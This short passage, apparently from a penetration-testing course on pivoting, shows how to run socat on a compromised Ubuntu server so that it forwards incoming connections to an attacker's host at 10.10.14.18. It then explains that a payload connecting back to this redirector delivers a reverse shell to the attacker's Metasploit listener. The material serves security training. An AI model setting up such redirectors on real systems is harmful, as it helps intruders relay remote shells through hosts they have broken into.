
[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start `socat` on the Ubuntu server.

#### Starting Socat Listener

  Socat Redirection with a Reverse Shell

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.